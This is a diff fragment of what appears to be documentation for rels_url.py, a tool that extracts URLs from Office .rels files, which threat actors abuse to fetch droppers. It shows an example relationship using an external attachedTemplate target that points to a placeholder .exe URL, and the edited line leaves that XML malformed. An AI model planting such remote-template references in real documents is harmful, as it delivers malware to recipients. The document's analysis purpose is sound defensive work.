@@ -15,7 +15,7 @@ Threat actors can use the RELS file to access URLs and download a dropper file. 
 
 **Example of a .rels file**  
 \<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-\<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://sample.com/sample1/sample2/file.exe" TargetMode="External"/>\</Relationships>  
+\<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://sample.com/sample1/sample2/file.exe" TargetMode="External">\<Relationships>  
 
 **To Use:**  
 rels_url.py  file.docx
